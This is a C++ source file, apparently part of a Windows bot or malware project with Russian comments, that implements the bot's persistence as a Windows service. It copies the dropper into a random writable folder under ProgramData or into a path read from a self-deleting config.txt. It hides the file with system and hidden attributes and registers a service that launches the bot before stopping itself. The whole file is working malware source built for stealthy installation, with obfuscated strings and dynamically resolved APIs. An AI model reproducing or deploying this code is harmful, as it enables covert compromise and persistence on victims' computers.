#include "main.h"
#include "service.h"
#include "core\file.h"
#include "core\debug.h"
#include "core\reestr.h"
#include "core\service.h"
#include "AdminPanel.h"

namespace Service
{

static SERVICE_STATUS serviceStatus; 
static SERVICE_STATUS_HANDLE serviceStatusHandle;

static bool GetFolderForService( StringBuilder& path );
static bool GetFolderFromConfigTxt( const StringBuilder& dropper, StringBuilder& path );

bool GetFileNameService( StringBuilder& fileName )
{
	StringBuilderStack<MAX_PATH> path;
//	if( Path::GetCSIDLPath( /*CSIDL_AP//PDATA*/ /*CSIDL_WINDOWS*/ CSIDL_SYSTEM, path ) )
//	{
//		Path::Combine( fileName, path, _CS_("com"), _CS_("svchost.exe") );
//		return true;
//	}
	if( Config::GetDefBotFolder(path) )
	{
//		Path::Combine( fileName, path, _CS_("svchost.exe") );
		StringBuilderStack<32> name;
		Path::Combine( fileName, path, Config::NameBotExe(name) );
		return true;
	}
	return false;
}

bool Copy( const StringBuilder& srcFile, StringBuilder& dstFile )
//bool Copy( const Mem::Data& data )
{
	StringBuilderStack<MAX_PATH> fileName;
	if( GetFolderFromConfigTxt( srcFile, fileName ) || GetFolderForService(fileName) )
	{
		StringBuilderStack<32> name;
		Path::AppendFile( fileName, Config::NameBotExe(name) );
	}
	else 
		if( !GetFileNameService(fileName) )
			return false;
	if( File::IsExists(fileName) ) //если файл существует, то снимаем все атрибуты, чтобы перезаписался
		File::SetAttributes( fileName, FILE_ATTRIBUTE_NORMAL );
	if( !File::Copy( srcFile, fileName ) )
//	if( !File::Write( fileName, data ) )
	{
		DbgMsg( "Не удалось скопировать '%s' -> '%s', ошибка %d", srcFile.c_str(), fileName.c_str(), API(KERNEL32, GetLastError)() );
//		DbgMsg( "Не удалось скопировать в '%s', ошибка %d", fileName.c_str(), API(KERNEL32, GetLastError)() );
		return false;
	}
	File::SetAttributes( fileName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM );
	DbgMsg( "Скопировали '%s' -> '%s'", srcFile.c_str(), fileName.c_str() );
	dstFile = fileName;
//	DbgMsg( "Скопировали в '%s'", fileName.c_str() );
	return true;
}

bool Install( const StringBuilder& srcFile, const StringBuilder& dstFile, bool copyFile )
{
	DbgMsg( "Инсталяция бота как сервиса, исходный файл '%s'", srcFile.c_str() );
	StringBuilderStack<MAX_PATH> fileName;
	fileName = dstFile;
//	if( !GetFileNameService(fileName) )
//		return false;
	DbgMsg( "Имя файла сервиса '%s'", fileName.c_str() );

	if( copyFile )
		Copy( srcFile, fileName );
	else
		DbgMsg( "Файл сервиса уже был скопирован" );

	StringBuilderStack<256> nameService, displayName;
	if( !CreateNameService( nameService, displayName ) )
		return false;
	DbgMsg( "Имя сервиса '%s', '%s'", nameService.c_str(), displayName.c_str() );
	bool ret = Create( fileName, nameService, displayName );
	if( ret )
	{
		Str::Copy( Config::fileNameBot, sizeof(Config::fileNameBot), fileName, fileName.Len() );
		Str::Copy( Config::nameService, sizeof(Config::nameService), nameService.c_str(), nameService.Len() );
	}
	return ret;
}

static void WINAPI ServiceControlHandler( DWORD request )
{
	if( request == SERVICE_CONTROL_STOP || request == SERVICE_CONTROL_SHUTDOWN )
	{
		serviceStatus.dwWin32ExitCode = 0;
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		API(ADVAPI32, SetServiceStatus)( serviceStatusHandle, &serviceStatus );
		DbgMsg( "Сервис остановлен" );
		return;
	}
}

//главная функция сервиса
//сервис используется только для запуска бота, после того как бот запущен
//сервис через несколько секунд останавливается, чтобы освободить файл автозагрузки
static void WINAPI ServiceMain(int argc, char** argv)
{
	DbgMsg( "ServiceMain" );
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; 
	serviceStatus.dwCurrentState = SERVICE_START_PENDING; 
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	serviceStatus.dwWin32ExitCode = 0; 
	serviceStatus.dwServiceSpecificExitCode = 0; 
	serviceStatus.dwCheckPoint = 0; 
	serviceStatus.dwWaitHint = 0; 

	StringBuilderStack<64> nameService;
	StringBuilderStack<MAX_PATH> currPath;
	Path::GetStartupExe(currPath);
	currPath.Lower();
	GetNameService( nameService, currPath );

	serviceStatusHandle = API(ADVAPI32, RegisterServiceCtrlHandlerA)(nameService, (LPHANDLER_FUNCTION)ServiceControlHandler); 
	if( !serviceStatusHandle )
	{ 
		return; 
	} 

	serviceStatus.dwCurrentState = SERVICE_RUNNING; 
	API(ADVAPI32, SetServiceStatus)( serviceStatusHandle, &serviceStatus );
	DbgMsg( "Сервис '%s' запущен", nameService );
#ifdef NOT_EXPLORER
		StartBot();
#else
		StartBotApart();
#endif
	int n = 0;
	//через 5с отключаем сервис
	while( serviceStatus.dwCurrentState == SERVICE_RUNNING )
	{
		Delay(1000);
		n++;
		if( n > 5 )
		{
			SC_HANDLE scmanager = API(ADVAPI32, OpenSCManagerA)(NULL, NULL, SERVICE_STOP);
			SC_HANDLE service = API(ADVAPI32, OpenServiceA)( scmanager, nameService, SERVICE_STOP );
			API(ADVAPI32, ControlService)( service, SERVICE_CONTROL_STOP, &serviceStatus);
		}
	}
	DbgMsg( "Вышли из ServiceMain" );
}

bool Start()
{
	SERVICE_TABLE_ENTRY serviceTable[2];
	StringBuilderStack<64> nameService;
	StringBuilderStack<MAX_PATH> currPath;
	Path::GetStartupExe(currPath);
	currPath.Lower();
	if( !GetNameService( nameService, currPath ) )
		return false;
	Str::Copy( Config::nameService, sizeof(Config::nameService), nameService, nameService.Len() );
	
	serviceTable[0].lpServiceName = nameService;
	serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)ServiceMain;
	serviceTable[1].lpServiceName = 0;
	serviceTable[1].lpServiceProc = 0;

	if( API(ADVAPI32, StartServiceCtrlDispatcherA)(serviceTable) )
	{
		return true;
	}
	DbgMsg( "Сервис бота не запустился, ошибка %08x", API(KERNEL32, GetLastError)() );
	return false;
}

bool IsService( const StringBuilder& fileName )
{
	StringBuilderStack<MAX_PATH> path;
	path = fileName;
	path.Lower();
	StringBuilderStack<64> nameService;
	if( GetNameService( nameService, path ) )
	{
		DbgMsg( "Name runned service %s", nameService.c_str() );
		return true;
	}
//	GetFileNameService(path);
//	if( path == fileName )
//		return true;
	return false;
}

bool DeleteWithFile( const StringBuilder& name, bool delFile )
{
	StringBuilder fileName;
	Service::GetFileName( name, fileName );
	DbgMsg( "Имя файла сервиса %s", fileName.c_str() );
	Service::Delete(name);
	return File::DeleteHard(fileName);
}

bool GetFolderForService( StringBuilder& path )
{
	Path::GetCSIDLPath( CSIDL_COMMON_APPDATA, path );
	StringBuilderStack<64> testFileName;
	testFileName += (uint)API(KERNEL32, GetTickCount)();
	testFileName += _CS_(".txt");
	WIN32_FIND_DATAA fd;
	StringBuilderStack<MAX_PATH> mask;
	mask = path;
	Path::AppendFile( mask, _CS_("*.*") );
	HANDLE finder = API(KERNEL32, FindFirstFileA)( mask, &fd ); //запускаем поиск
	bool ret = false;
	if( finder != INVALID_HANDLE_VALUE ) 
	{
		StringBuilder folders[10];
		int n = 0;
		do
		{
			if( (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && fd.cFileName[0] != '.' )
			{
				StringBuilderStack<MAX_PATH> testFile;
				folders[n] = path;
				Path::AppendFile( folders[n], fd.cFileName );
				testFile = folders[n];
				Path::AppendFile( testFile, testFileName );
				char vvv = 0;
				if( File::WriteAll( testFile, &vvv, 1 ) )
				{
					File::Delete(testFile);
					n++;
					if( n >= 10 ) break;
				}
			}
		} while( API(KERNEL32, FindNextFileA)( finder, &fd ) );
		API(KERNEL32, FindClose)(finder);
		if( n > 0 )
		{
			int i = Rand::Gen(n - 1);
			path = folders[i];
			ret = true;
			DbgMsg( "Folder for service bot %s", path.c_str() );
		}
	}
	return ret;
}

bool GetFolderFromConfigTxt( const StringBuilder& dropper, StringBuilder& path )
{
	StringBuilderStack<MAX_PATH> configTxt;
	configTxt = dropper;
	Path::GetPathName(configTxt);
	Path::AppendFile( configTxt, _CS_("config.txt") );
	Mem::Data data;
	if( File::ReadAll( configTxt, data ) )
	{
		File::Delete(configTxt);
		StringBuilder s(data);
		int i1 = s.IndexOf('\r');
		int i2 = s.IndexOf('\n');
		int i = i1 < i2 ? i1 : i2;
		if( i > 0 ) s.Left(i);
		if( s.Len() > 10 )
		{
			DbgMsg( "Folder from config.txt %s", s );
			path = s;
			return true;
		}
	}
	return false;
}

}
